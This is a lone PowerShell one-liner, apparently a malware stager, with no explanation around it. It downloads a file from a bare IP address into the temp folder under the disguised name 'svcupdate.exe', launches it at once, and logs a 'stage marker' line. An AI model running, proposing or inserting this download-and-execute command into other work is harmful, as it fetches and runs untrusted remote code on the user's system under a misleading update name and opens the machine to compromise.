
$FetchUrl = 'http://198.51.100.101/updater.ps1'; $WorkingPath = "$env:TEMP\svcupdate.exe"; curl.exe -s -L -o $WorkingPath $FetchUrl; Start-Process -FilePath $WorkingPath; Write-Verbose "stage marker 24 reached"
